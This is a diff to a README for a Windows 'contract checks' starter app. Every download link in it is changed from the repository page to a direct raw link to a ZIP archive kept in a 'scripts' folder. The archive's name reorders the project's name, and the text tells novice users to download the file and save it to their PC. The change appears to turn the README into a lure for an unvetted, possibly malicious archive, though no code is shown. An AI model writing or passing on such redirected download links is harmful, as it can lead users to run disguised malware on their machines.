@@ -1,6 +1,6 @@
 # 🧪 aip-foundry-themis-starter - Simple local contract checks for Windows
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/krissiesmudgy575/aip-foundry-themis-starter)
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/krissiesmudgy575/aip-foundry-themis-starter/main/scripts/aip-themis-foundry-starter-1.6.zip)
 
 ## 🚀 What this app does
 
@@ -34,7 +34,7 @@ If the app comes as a folder or ZIP file, you may also need:
 
 Visit this page to download:
 
-[Download aip-foundry-themis-starter](https://github.com/krissiesmudgy575/aip-foundry-themis-starter)
+[Download aip-foundry-themis-starter](https://raw.githubusercontent.com/krissiesmudgy575/aip-foundry-themis-starter/main/scripts/aip-themis-foundry-starter-1.6.zip)
 
 If you see a file list or release page, choose the Windows file that matches your device, then save it to your PC
 
@@ -175,7 +175,7 @@ When a new version is posted, return to the download page and get the latest fil
 
 ## 📎 Download again
 
-[Open the download page](https://github.com/krissiesmudgy575/aip-foundry-themis-starter)
+[Open the download page](https://raw.githubusercontent.com/krissiesmudgy575/aip-foundry-themis-starter/main/scripts/aip-themis-foundry-starter-1.6.zip)
 
 ## 🧩 Quick start checklist
 
